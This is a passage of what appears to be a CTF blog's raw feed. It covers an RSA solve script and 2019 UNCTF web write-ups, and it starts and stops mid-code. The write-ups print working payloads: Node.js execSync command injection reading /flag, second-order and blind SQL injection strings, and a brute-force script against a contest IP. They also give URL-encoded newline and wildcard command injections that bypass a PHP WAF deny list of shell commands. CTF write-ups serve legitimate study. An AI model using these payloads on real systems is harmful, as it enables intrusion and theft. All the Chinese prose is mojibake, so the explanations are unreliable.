class="keyword">print</span> p</span><br><span class="line">    n = n / p</span><br></pre></td></tr></table></figure><p>è·‘ä¸ªåæ¥åˆ†é’Ÿåº”è¯¥å¯ä»¥å¾—åˆ°</p><p><img src="https://i.loli.net/2020/04/30/xqjZMEIm2s39GQv.png" alt="1"></p><p>ï¼ˆæˆ‘æ”¾ç€ç¨‹åºæ²¡ç®¡ï¼Œè·‘äº†å¥½å‡ ä¸ªå°æ—¶åå¾—åˆ°ï¼‰</p><p><img src="https://i.loli.net/2020/04/30/97XTafejQdtK6x2.png" alt="2"></p><p>ä½†å…¶å®æœ‰å‰é¢6ä¸ª<code>740160703366837</code>å¤§æ¦‚å·²ç»æ˜¯å¤Ÿäº†ï¼Œ<code>740160703366837</code>çš„6æ¬¡æ–¹å¤§æ¦‚æœ‰90ä½ï¼Œè€Œå¦‚æœflagæ˜¯md5å€¼å¾—è¯ï¼Œé•¿åº¦æ˜¯32+6ã€‚ç”±76ä½åå…­è¿›åˆ¶è¡¨ç¤ºï¼Œæœ€å¤§ç”±92ä½åè¿›åˆ¶è¡¨ç¤ºï¼ˆæ˜¾ç„¶æ˜¯ä¸å¯èƒ½çš„ï¼Œè¿™ä¸ªæ—¶å€™å·²ç»ä¸æ˜¯å¯æ‰“å°å­—ç¬¦äº†ï¼‰æ‰€ä»¥90ä½ä½œä¸ºnåº”è¯¥å·²ç»æ˜¯å¤Ÿäº†ã€‚ï¼ˆå†ä¸æµå°±å†ç­‰ä¸€ä¼šå„¿,å¤šå‡ºæ¥å‡ ä¸ªå°±å¥½äº†ï¼‰</p><p>expï¼š</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">from gmpy2 import *</span><br><span class="line">e = 0x10001</span><br><span class="line">c = <span class="comment">#é¢˜ç›®æ‰€ç»™</span></span><br><span class="line">p = 740160703366837</span><br><span class="line">n = p**6</span><br><span class="line">c = c % n</span><br><span class="line">phi = (p-1)*(p**6)</span><br><span class="line">d = invert(e,phi)</span><br><span class="line"><span class="section">print(hex(pow(c,d,n))[2:].decode('hex'))</span></span><br></pre></td></tr></table></figure><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20191106003417-1ca71876-ffea-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191106003417-1ca71876-ffea-1.png" alt="img"></a></p><p>è¿™é‡Œç›¸å½“äºæˆ‘ä»¬ç›´æ¥æŠŠåŸé¢˜çš„$n$ç»™çº‚æ”¹äº†ï¼Œ</p><p>ä½†ä¸ºå•¥è¿™é‡Œæˆ‘ä»¬å¯ä»¥ç›´æ¥æ”¹$n$å‘¢ï¼Ÿ</p><p>è¿™é‡Œå†å›é¡¾ä¸€ä¸‹åŸºç¡€çŸ¥è¯†å¥½äº†</p><p>ä»¥ä¸‹æ˜¯ $M\equiv C^d pmod{N}$ çš„è¯æ˜</p><p><img src="https://i.loli.net/2020/04/30/zmodaOUq2NSv6IP.png" alt="RSAè§£å¯†éªŒè¯"></p><p>é¦–å…ˆï¼Œçœ‹åˆ°è¿™é‡Œè¦æ±‚$m&lt;n$ï¼Œæ‰€ä»¥è¿™é‡Œn_newå¤§äºmå³å¯</p><p>å…¶æ¬¡ï¼Œç”±äºn_new | nï¼Œæ‰€ä»¥ c % n_new == pow(m ,e ,n_new)</p><p>æ¨ç†å¦‚ä¸‹</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">          n = n_new * <span class="keyword">x</span></span><br><span class="line">          <span class="keyword">c</span> = m^e % n</span><br><span class="line">        m^e = k*n + <span class="keyword">c</span></span><br><span class="line">        m^e = k*n_new*<span class="keyword">x</span> + <span class="keyword">c</span></span><br><span class="line">m^e % n_new = <span class="keyword">c</span> % n_new</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥åªè¦æ–°çš„Næ»¡è¶³ï¼Œ$m&lt;N$, $m^e \equiv  c  \pmod {N}$ï¼Œå¹¶ä¸”$gcd(e,phi(N))=1$ï¼Œå³å¯é€†å‘æ±‚å‡º$m$æ¥ã€‚</p><p>è€Œä¸€èˆ¬æƒ…å†µä¸‹$n=p*q$ï¼Œæ‰€ä»¥åŸºæœ¬ä¸ç»™ä½ ç¯¡æ”¹$n$çš„æœºä¼š~</p><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>è¿™ä¸€æ¬¡å­¦ä¹ å¤§æ¦‚äº†è§£äº†</p><p>Further Attacks on Server-Aided RSA Cryptosystemsï¼Œ</p><p>Pollardâ€™s Ï algorithmï¼Œ</p><p>ä»¥åŠå¤šç´ æ•°RSAç³»ç»Ÿçš„å…¶ä¸­ä¸€ç§è§£æ³•ï¼Œ</p><p>æœ€åï¼Œæ„Ÿè°¢Lurå¤§ä½¬çš„æŒ‡ç‚¹~</p><p><del>ä½†è™½ç„¶çŸ¥é“è¿™ä¸ªç®—æ³•çš„æµç¨‹ï¼Œå…¶å®å¹¶ä¸æ‡‚åŸç†ï¼Œå¥½ç¥å¥‡çš„æ„Ÿè§‰ï¼Œæœ‰æ²¡æœ‰å¤§ä½¬æ•™æ•™ä¿º</del></p><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p><a href="https://en.wikipedia.org/wiki/Pollard's_kangaroo_algorithm" target="_blank" rel="noopener">Pollardâ€™s rho algorithm</a></p><p><a href="http://www.hghhgghhg.top/2019/10/28/UNCTFWP/#simple-rsa" target="_blank" rel="noopener">UNCTF-simple-rsa Write-Up</a></p>]]></content>
      
      
      <categories>
          
          <category> å¯†ç å°å±‹ </category>
          
          <category> Rsa </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Rsa </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2019 UNCTF</title>
      <link href="/2019/11/08/2019UNCTF/"/>
      <url>/2019/11/08/2019UNCTF/</url>
      
        <content type="html"><![CDATA[<p>åŸæ–‡å‘è¡¨äº<a href="https://www.anquanke.com/post/id/190613" target="_blank" rel="noopener">å®‰å…¨å®¢</a></p><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="å¸®èµµæ€»å¾å©š"><a href="#å¸®èµµæ€»å¾å©š" class="headerlink" title="å¸®èµµæ€»å¾å©š"></a>å¸®èµµæ€»å¾å©š</h3><p>å‘ƒï¼Œå¸®ä¸äº†èµµæ€»å¾å©š~ã€‚</p><p>f12ï¼Œæœ‰ä¸ªhintï¼š<code>&lt;!-- I like rockyou! --&gt;</code></p><p>ä¸Šrockyouå­—å…¸ï¼ˆä¸å¯èƒ½çš„ï¼Œbpä¼šç‚¸ï¼Œä¸Štop3000ï¼‰ï¼Œç›´æ¥çˆ†ï¼Œå¾—åˆ°flag</p><p><a href="https://p5.ssl.qhimg.com/t01fe0b0209adb8549f.png" target="_blank" rel="noopener"><img src="https://p5.ssl.qhimg.com/t01fe0b0209adb8549f.png" alt="img"></a></p><p>å¾—åˆ°flagï¼šflag{57fc636a42f46c7658110a631256f5cb}</p><h3 id="ç®€å•çš„å¤‡å¿˜å½•"><a href="#ç®€å•çš„å¤‡å¿˜å½•" class="headerlink" title="ç®€å•çš„å¤‡å¿˜å½•"></a>ç®€å•çš„å¤‡å¿˜å½•</h3><p>emmmï¼Œæ²¡å­¦è¿‡çš„è¯­è¨€ï¼Œè¿›å»å„ç§fuzzï¼Œ</p><p>å‘ç°æ‰“ä¸€ä¸ªå­—æ¯ä»–å°±ä¼šç»™äº›é€‰æ‹©</p><p><a href="https://p5.ssl.qhimg.com/t01b556d8884c351425.png" target="_blank" rel="noopener"><img src="https://p5.ssl.qhimg.com/t01b556d8884c351425.png" alt="img"></a></p><p>æœ€åéšç¼˜æ•´å‡ºflag</p><p><a href="https://p3.ssl.qhimg.com/t01a82e3b736dd6d396.png" target="_blank" rel="noopener"><img src="https://p3.ssl.qhimg.com/t01a82e3b736dd6d396.png" alt="img"></a></p><p>flag{3ad4aaedf408c147d5f747f7ce76d2b4}</p><h3 id="checkin"><a href="#checkin" class="headerlink" title="checkin"></a>checkin</h3><p>è¿›å…¥æ˜¯ä¸ªèŠå¤©æ¡†ï¼Œ/name æ”¹åå­—</p><p>/flag ä¼šæ‰“å°flag1flag1flag1â€¦.</p><p>/more æ˜¾ç¤º/flag â€“ å°ä¼™å­â€¦</p><p>/calc å¯ä»¥è®¡ç®—ï¼Œï¼ˆçŒœæµ‹è¿™é‡Œå¯èƒ½æœ‰å‘½ä»¤æ‰§è¡Œï¼‰</p><p><a href="https://p5.ssl.qhimg.com/t01c07d61198ccbf3c5.png" target="_blank" rel="noopener"><img src="https://p5.ssl.qhimg.com/t01c07d61198ccbf3c5.png" alt="img"></a></p><p>æ‰¾åˆ°ç¯‡æ–‡ç« <a href="https://m.jb51.net/article/91411.htm`" target="_blank" rel="noopener">https://m.jb51.net/article/91411.htm`</a></p><p>äºæ˜¯è¯•äº†è¯•é‡Œé¢çš„payloadï¼š/calc require(â€˜child_processâ€™).exec(â€˜lsâ€™).toString()</p><p>è¿”å›äº†ï¼šè¡€å°æ¿: [object Object]</p><p>ç„¶åè¯•äº†è¯•execSyncï¼š/calc require(â€˜child_processâ€™).execSync(â€˜lsâ€™).toString()</p><p>è¿”å›äº†ï¼šbin games include lib local sbin share srcå‘½ä»¤æ‰§è¡ŒæˆåŠŸ</p><p>äºæ˜¯è¯»å–flagï¼š/calc require(â€˜child_processâ€™).execSync(â€˜cat /flagâ€™).toString()</p><p>è¿”å›ï¼šè¡€å°æ¿: undefined</p><p>åº”è¯¥æ˜¯ç©ºæ ¼çš„é—®é¢˜ï¼Œé‚£å°±ç”¨$IFSæ›¿ä»£ï¼š/calc require(â€˜child_processâ€™).execSync(â€˜cat$IFS/flagâ€™).toString()</p><p>æˆåŠŸæ‹¿åˆ°flag</p><p><a href="https://p3.ssl.qhimg.com/t015673743622d5d679.png" target="_blank" rel="noopener"><img src="https://p3.ssl.qhimg.com/t015673743622d5d679.png" alt="img"></a></p><p>flag{0e4d1980ef6f8a81428f83e8e1c6e22b}</p><h3 id="Twice-Insert"><a href="#Twice-Insert" class="headerlink" title="Twice_Insert"></a>Twice_Insert</h3><p>åˆšå¼€å§‹è¿˜ä»¥ä¸ºæ˜¯åŸé¢˜ï¼Œæ³¨å†Œadminâ€™#åæ”¹å¯†ç ï¼Œç„¶åç”¨adminç™»å½•ï¼Œå‘ç°å¹¶æ²¡æœ‰flagï¼ˆå¯æ¶å‘¢</p><p>ä½†æ˜¯ï¼Œæ—¢ç„¶è¿™ä¸ªäºŒæ¬¡æ³¨å…¥ç‚¹è¿˜åœ¨ï¼Œé‚£ä»ç„¶æ˜¯å¯ä»¥è¢«æ‹¿æ¥åˆ©ç”¨çš„</p><p>åœ¨å•å¼•å·å’Œ#ä¸­é—´å°±å¯ä»¥æ³¨å…¥è¯­å¥</p><p>å„ç§fuzzåï¼Œå‘ç°å¾ˆå¤šå‡½æ•°éƒ½è¢«wafäº†ï¼ˆsmarterâ€¦harderâ€¦å¤§æ¦‚æ˜¯æœ‰å›æ˜¾çš„ç›²æ³¨äº†ï¼‰</p><p>æœ€åï¼Œå‘ç°äº†è¿™ç¯‡æ–‡ç« <a href="https://www.smi1e.top/sql%E6%B3%A8%E5%85%A5%E7%AC%94%E8%AE%B0/" target="_blank" rel="noopener">https://www.smi1e.top/sql%E6%B3%A8%E5%85%A5%E7%AC%94%E8%AE%B0/</a></p><p><a href="https://p1.ssl.qhimg.com/t017ee419351442a907.png" target="_blank" rel="noopener"><img src="https://p1.ssl.qhimg.com/t017ee419351442a907.png" alt="img"></a></p><p>äºæ˜¯è¯•ç€æ„é€ payloadï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">"admin' and ascii(substr((<span class="keyword">select</span> <span class="keyword">group_concat</span>(<span class="keyword">distinct</span> database_name)<span class="keyword">from</span> mysql.innodb_index_stats),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">30</span><span class="comment">###vanish"</span></span><br><span class="line"></span><br><span class="line"><span class="string">"admin' and ascii(substr((select group_concat(distinct table_name)from mysql.innodb_index_stats),1,1))=30###vanish"</span></span><br></pre></td></tr></table></figure><p>ç„¶åå†™ä¸€ä¸ªè‡ªåŠ¨åŒ–è„šæœ¬ã€‚ä¸æ–­åœ°æ³¨å†Œï¼Œç™»å½•ï¼Œæ”¹å¯†ç ï¼Œç„¶åæ ¹æ®å›æ˜¾æŒ‰ä½çˆ†ç ´åº“ã€è¡¨å³å¯</p><p>æœ€ç»ˆçš„payloadï¼šâ€adminâ€™ and ascii(substr((select * from fl4g),%d,1))=%d###vanishâ€%(i,j)</p><p><a href="https://p1.ssl.qhimg.com/t0140ff12ae8dcf0041.png" target="_blank" rel="noopener"><img src="https://p1.ssl.qhimg.com/t0140ff12ae8dcf0041.png" alt="img"></a></p><p>å¾—åˆ°flagï¼šUNCTF{585ae8df50433972bb6ebd76e3ebd9f4}ï¼ˆä¸çŸ¥é“ä¸ºå•¥ï¼Œå¼€å¤´æœ‰æ—¶å€™ä¼šç¼ºï¼‰</p><h3 id="NSB-Reset-Password"><a href="#NSB-Reset-Password" class="headerlink" title="NSB Reset Password"></a>NSB Reset Password</h3><p>æ³¨å†Œ-&gt;æ”¹å¯†ç ï¼šå‘éªŒè¯ç -&gt;é‡ç½®å¯†ç </p><p>ä¸‰ä¸ªåŒ…æŠ“è¿‡æ¥ï¼Œå‘ç°sessionIDéƒ½æ²¡æœ‰å˜åŠ¨è¿‡ã€‚</p><p>è¯•ç€çŒœæƒ³è¿™ä¸ªæ”¹å¯†ç çš„é€»è¾‘ï¼šå½“æˆ‘ç»™è‡ªå·±çš„è´¦æˆ·å‘é‚®ä»¶ï¼Œç„¶åè¾“å…¥éªŒè¯ç ï¼ŒéªŒè¯é€šè¿‡åï¼Œè¿™ä¸ªsessionIDå°±è·å¾—äº†æ›´æ”¹å¯†ç çš„æƒåˆ©ï¼Œä½†æ˜¯æ˜¯æ›´æ”¹è°çš„å¯†ç å‘¢ï¼Ÿè´¦æˆ·çš„ä¿¡æ¯æƒ³å¿…æ˜¯å­˜åœ¨sessionIDé‡Œçš„ã€‚</p><p>ä½†ç»è¿‡æµ‹éªŒï¼Œæ— è®ºæ˜¯ç»™adminå‘é‚®ä»¶ï¼Œè¿˜æ˜¯ç»™è‡ªå·±å‘é‚®ä»¶ï¼ŒsessionIDéƒ½æ²¡æœ‰å˜è¿‡ã€‚é‚£ä¹ˆï¼Œæ˜¾ç„¶sessionIDé‡Œçš„å‚¨å­˜çš„è´¦æˆ·ä¿¡æ¯çš„é‚£éƒ¨åˆ†æ˜¯å¯ä»¥è¢«è¦†ç›–çš„ï¼Œæ‰€ä»¥è§£é¢˜æµç¨‹ï¼š</p><p>å…ˆæ³¨å†Œ-&gt;æ›´æ”¹å¯†ç ï¼šå‘é€éªŒè¯ç -&gt;åˆ°é‡ç½®å¯†ç çš„ç•Œé¢ï¼Œæ­¤æ—¶å†å¼€ä¸€ä¸ªçª—å£ï¼Œå‘é€æ›´æ”¹adminå¯†ç çš„é‚®ä»¶ï¼ˆsessionIDé‡Œçš„ç”¨æˆ·è¢«è¦†ç›–ä¸ºadminï¼‰ï¼Œç„¶ååˆå›å»ï¼Œæ›´æ”¹å¯†ç ï¼ˆæ­¤æ—¶æ›´æ”¹çš„å°±æ˜¯sessionIDé‡Œçš„è´¦æˆ·ï¼Œå³adminçš„å¯†ç ï¼‰ï¼Œç„¶åç”¨è‡ªå·±æ›´æ”¹çš„å¯†ç ç™»å½•adminè´¦æˆ·å³å¯è·flag</p><p><a href="https://p5.ssl.qhimg.com/t01ba8c30adb43d2d38.png" target="_blank" rel="noopener"><img src="https://p5.ssl.qhimg.com/t01ba8c30adb43d2d38.png" alt="img"></a></p><p>flagï¼šflag{175f3098f80735ddfdfbd4588f6b1082}</p><h3 id="easy-admin"><a href="#easy-admin" class="headerlink" title="easy_admin"></a>easy_admin</h3><p>å¾ˆå®¹æ˜“å‘ç°åœ¨/index.php?file=forgetè¿™é‡Œå­˜åœ¨æ³¨å…¥</p><p>fuzzåå‘ç°è¿‡æ»¤äº†and select whereã€‚ã€‚ã€‚</p><p>ç„¶åå¡äº†å¥½ä¹…ä¸çŸ¥é“æ€ä¹ˆæŸ¥adminçš„å¯†ç ï¼Œæœ€åç´¢æ€§ç›´æ¥ password ï¼ˆbugkuæœ‰ä¸€é“è¿‡æ»¤å¾ˆä¸¥çš„é¢˜å°±æ˜¯è¿™æ ·bypassï¼Œï¼‰</p><p>expï¼š</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://101.71.29.5:10045/index.php?file=forget"</span></span><br><span class="line"></span><br><span class="line">r = requests.Session()</span><br><span class="line"></span><br><span class="line">password=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="built_in">in</span> range(<span class="number">1</span>,<span class="number">40</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="built_in">in</span> range(ord(<span class="string">'0'</span>),ord(<span class="string">'&#125;'</span>)):</span><br><span class="line">        <span class="keyword">data</span> = &#123;</span><br><span class="line">            <span class="string">"username"</span>:<span class="string">"-1'or ascii(substr((password),%d,1))=%d#"</span>%(i,j)</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        res = r.post(url, <span class="keyword">data</span>=<span class="keyword">data</span>)</span><br><span class="line">        #print res.<span class="keyword">text</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">"ok reset password"</span> <span class="built_in">in</span> res.<span class="keyword">text</span>:</span><br><span class="line">            password = password + chr(j)</span><br><span class="line">            print password</span><br><span class="line">            break</span><br></pre></td></tr></table></figure><p>å¾—åˆ°å¯†ç ï¼š</p><p><a href="https://p1.ssl.qhimg.com/t01276c1041f642fd59.png" target="_blank" rel="noopener"><img src="https://p1.ssl.qhimg.com/t01276c1041f642fd59.png" alt="img"></a></p><p>ç™»å½•åyes you are admin, but you canâ€™ to get the flag, because admin will access the website from</p><p>from whereï¼Ÿ</p><p>ç›²çŒœæ˜¯127.0.0.1ï¼Œç„¶åå†æŠ¥æ–‡å¤´åŠ ä¸€ä¸ªRefererï¼Œå¾—åˆ°åä¸€åŠflag</p><p><a href="https://p4.ssl.qhimg.com/t01cf6314a828f8eeed.png" target="_blank" rel="noopener"><img src="https://p4.ssl.qhimg.com/t01cf6314a828f8eeed.png" alt="img"></a></p><p>flagï¼šflag{nevertoolatetox}</p><h3 id="Bypass"><a href="#Bypass" class="headerlink" title="Bypass"></a>Bypass</h3><p>phpçš„æ­£åˆ™æœ‰ç‚¹å°æ¼æ´ï¼Œä¸¤ä¸ªæ–œæ ä¸¢è¿›phpåªå‰©ä¸€ä¸ªæ–œæ äº†ï¼Œç„¶åè¿™ä¸ªæ–œæ ä¸¢è¿›æ­£åˆ™å°±ç”¨æ¥è½¬ä¹‰äº†</p><p>è€Œè¿™ä¸€é¢˜ï¼Œå‡ºé¢˜äººä¼¼ä¹æ˜¯ç»™äº†ä¸ªhint</p><p><a href="https://p3.ssl.qhimg.com/t01b0ca65aa5a902b40.png" target="_blank" rel="noopener"><img src="https://p3.ssl.qhimg.com/t01b0ca65aa5a902b40.png" alt="img"></a></p><p>è¿™é‡Œæ•…æ„æ¢äº†ä¸‹ä½ç½®ã€‚</p><p>æ‰€ä»¥è‡ªå·±åšäº†ä¸‹å®éªŒï¼Œå‘ç°ï¼Œç”±äºè¿™ä¸ªå°æ¼æ´ï¼Œaè¢«è¿‡æ»¤äº†|<em>è€Œä¸æ˜¯</em>ï¼Œbè¢«è¿‡æ»¤äº†|\nï¼Œè€Œä¸æ˜¯è¢«è¿‡æ»¤äº†\n</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="comment">//highlight_file(__FILE__);</span></span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>['a'];</span><br><span class="line"><span class="variable">$b</span> = <span class="variable">$_GET</span>['b'];</span><br><span class="line"><span class="comment">// try bypass it</span></span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">"/\'|\"</span>|,|;|\`|\\|\*|\<span class="keyword">n</span>|\t|\xA0|\r|\&#123;|\&#125;|\(|\)|&lt;|\&amp;[^\<span class="keyword">d</span>]|@|\||tail|bin|less|<span class="keyword">more</span>|string|<span class="keyword">nl</span>|<span class="keyword">pwd</span>|<span class="keyword">cat</span>|<span class="keyword">sh</span>|flag|find|<span class="keyword">ls</span>|grep|echo|w/is", <span class="variable">$a</span>))&#123;</span><br><span class="line">    <span class="variable">$a</span>=<span class="string">""</span>;</span><br><span class="line">    echo<span class="string">"waf-a\n"</span>;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">"/\'|\"</span>|;|,|\`|\*|\\|\<span class="keyword">n</span>|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|&lt;|\&amp;[^\<span class="keyword">d</span>]|@|\||tail|bin|less|<span class="keyword">more</span>|string|<span class="keyword">nl</span>|<span class="keyword">pwd</span>|<span class="keyword">cat</span>|<span class="keyword">sh</span>|flag|find|<span class="keyword">ls</span>|grep|echo|w/is", <span class="variable">$b</span>))&#123;</span><br><span class="line">    <span class="variable">$b</span>=<span class="string">""</span>;</span><br><span class="line">    echo<span class="string">"waf-b"</span>;&#125;</span><br><span class="line">echo <span class="variable">$a</span>;</span><br><span class="line"><span class="keyword">print</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">echo <span class="variable">$b</span>;</span><br></pre></td></tr></table></figure><p><a href="https://p4.ssl.qhimg.com/t010bbbade7d82cfd04.png" target="_blank" rel="noopener"><img src="https://p4.ssl.qhimg.com/t010bbbade7d82cfd04.png" alt="img"></a></p><p><a href="https://p2.ssl.qhimg.com/t0158c3f445ebc19a10.png" target="_blank" rel="noopener"><img src="https://p2.ssl.qhimg.com/t0158c3f445ebc19a10.png" alt="img"></a></p><p>åŒæ—¶ï¼Œa,bå°±éƒ½å¯ä»¥ç”¨æ–œæ äº†ï¼Œ</p><p>äºæ˜¯å°±å¯ä»¥é—­åˆå¼•å·åä»»æ„å‘½ä»¤æ‰§è¡Œ</p><p>å¯¹äºå‘½ä»¤çš„è¿‡æ»¤æœ‰ä¸¤ç§ç»•è¿‡æ–¹æ³•ï¼Œä¸€ä¸ªæ˜¯linuxä¸‹ï¼Œç”¨é€šé…ç¬¦?ç»•è¿‡ï¼Œæ¯”å¦‚varå†™æˆv?r</p><p>è§£é¢˜ï¼š</p><ol><li><p><a href="http://101.71.29.5:10054/?a=\&amp;b=%0al\s%20/%0a" target="_blank" rel="noopener">http://101.71.29.5:10054/?a=\&amp;b=%0al\s%20/%0a</a></p></li><li><p>flagä¸åœ¨æ ¹ç›®å½•ä¸‹ï¼Œé‚£å°±æ‰¾æ‰¾ï¼Œ</p></li></ol><ul><li><a href="http://101.71.29.5:10054/?a=\&amp;b=%0afin\d%20/va?/???/htm?/%0a" target="_blank" rel="noopener">http://101.71.29.5:10054/?a=\&amp;b=%0afin\d%20/va?/???/htm?/%0a</a></li></ul><ol><li>æ‰¾åˆ°äº†</li></ol><ul><li><a href="http://101.71.29.5:10054/?a=\&amp;b=%0aca\t%20/va?/???/htm?/.F1jh_/h3R3_1S_your_F1A9.txt%0a" target="_blank" rel="noopener">http://101.71.29.5:10054/?a=\&amp;b=%0aca\t%20/va?/???/htm?/.F1jh_/h3R3_1S_your_F1A9.txt%0a</a></li></ul><p><a href="https://p4.ssl.qhimg.com/t011ea19b8dc163f851.png" target="_blank" rel="noopener"><img src="https://p4.ssl.qhimg.com/t011ea19b8dc163f851.png" alt="img"></a></p><p>flagï¼šunctf{86dfe85d7c5842c5c04adae104193ee1}</p><h3 id="å®¡è®¡ä¸€ä¸‹ä¸–ç•Œä¸Šæœ€å¥½çš„è¯­è¨€å§"><a href="#å®¡è®¡ä¸€ä¸‹ä¸–ç•Œä¸Šæœ€å¥½çš„è¯­è¨€å§" class="headerlink" title="å®¡è®¡ä¸€ä¸‹ä¸–ç•Œä¸Šæœ€å¥½çš„è¯­è¨€å§"></a>å®¡è®¡ä¸€ä¸‹ä¸–ç•Œä¸Šæœ€å¥½çš„è¯­è¨€å§</h3><p>å…ˆä¸¢è¿›Seay</p><p><a href="https://p5.ssl.qhimg.com/t01750cb1862de2f113.png" target="_blank" rel="noopener"><img src="https://p5.ssl.qhimg.com/t01750cb1862de2f113.png" alt="img"></a></p><p>parse_template.phpä¸­æœ‰ä¸€ä¸ªeval</p><p>æŸ¥ä¸€ä¸‹è°ƒç”¨å…³ç³»ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">index.phpï¼šparse_again($searchword);</span><br><span class="line"></span><br><span class="line">parse_template.php:</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">parse_again</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $template_html,$searchword;</span><br><span class="line">    $searchnum    = <span class="keyword">isset</span>($GLOBALS[<span class="string">'searchnum'</span>])?$GLOBALS[<span class="string">'searchnum'</span>]:<span class="string">""</span>;</span><br><span class="line">    $type      = <span class="keyword">isset</span>($GLOBALS[<span class="string">'type'</span>])?$GLOBALS[<span class="string">'type'</span>]:<span class="string">""</span>;</span><br><span class="line">    $typename = <span class="keyword">isset</span>($GLOBALS[<span class="string">'typename'</span>])?$GLOBALS[<span class="string">'typename'</span>]:<span class="string">""</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    $searchword = substr(RemoveXSS($searchword),<span class="number">0</span>,<span class="number">20</span>);</span><br><span class="line">    $searchnum = substr(RemoveXSS($searchnum),<span class="number">0</span>,<span class="number">20</span>);</span><br><span class="line">    $type = substr(RemoveXSS($type),<span class="number">0</span>,<span class="number">20</span>);</span><br><span class="line">    $typename = substr(RemoveXSS($typename),<span class="number">0</span>,<span class="number">20</span>);</span><br><span class="line">    $template_html = str_replace(<span class="string">"&#123;haha:searchword&#125;"</span>,$searchword,$template_html);</span><br><span class="line">    $template_html = str_replace(<span class="string">"&#123;haha:searchnum&#125;"</span>,$searchnum,$template_html);</span><br><span class="line">    $template_html = str_replace(<span class="string">"&#123;haha:type&#125;"</span>,$type,$template_html);</span><br><span class="line">    $template_html = str_replace(<span class="string">"&#123;haha:typename&#125;"</span>,$typename,$template_html);</span><br><span class="line">    $template_html = parseIf($template_html);</span><br><span class="line">    <span class="keyword">return</span> $template_html;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">parseIf</span><span class="params">($content)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (strpos($content,<span class="string">'&#123;if:'</span>)=== <span class="keyword">false</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> $content;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $Rule = <span class="string">"/&#123;if:(.*?)&#125;(.*?)&#123;end if&#125;/is"</span>;</span><br><span class="line">        preg_match_all($Rule,$content,$iar);</span><br><span class="line">        $arlen=count($iar[<span class="number">0</span>]);</span><br><span class="line">        $elseIfFlag=<span class="keyword">false</span>;</span><br><span class="line">        <span class="keyword">for</span>($m=<span class="number">0</span>;$m&lt;$arlen;$m++)&#123;</span><br><span class="line">            $strIf=$iar[<span class="number">1</span>][$m];</span><br><span class="line">            $strIf=parseStrIf($strIf);</span><br><span class="line">            @<span class="keyword">eval</span>(<span 